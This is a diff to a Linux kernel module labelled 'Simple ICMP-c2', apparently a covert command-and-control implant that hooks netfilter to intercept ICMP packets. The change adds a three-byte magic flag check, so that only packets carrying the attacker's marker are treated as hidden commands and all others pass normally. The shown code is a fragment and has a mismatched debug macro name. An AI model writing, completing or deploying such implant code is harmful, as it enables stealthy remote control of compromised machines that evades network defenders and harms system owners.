@@ -22,6 +22,9 @@ MODULE_DESCRIPTION("Simple ICMP-c2");
 #define ICMP_REPLY  0
 #define ICMP_HLEN   sizeof(struct icmphdr)
 
+#define FLAG        "\x70\x95\x05"
+#define FLAG_LEN    3
+
 static struct socket *raw_socket;
 static struct nf_hook_ops nfho;
 unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
@@ -128,9 +131,20 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 
     icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;
     payload = (void *)icmph + ICMP_HLEN;
-
     #ifdef DEBUF_K
         pr_info("icmp_payload_len: %d\n", icmp_payload_len);
+    #endif
+    if(icmp_payload_len <= 0 || icmp_payload_len < FLAG_LEN){
+        return NF_ACCEPT;
+    }
+
+    // Check for flag
+    if(strncmp(payload, FLAG, FLAG_LEN) != 0){
+        return NF_ACCEPT;
+    }
+    
+    #ifdef DEBUG_K
+        pr_info("Payload contained flag\n");
     #endif
 
     // TODO: Check if ignore all is set
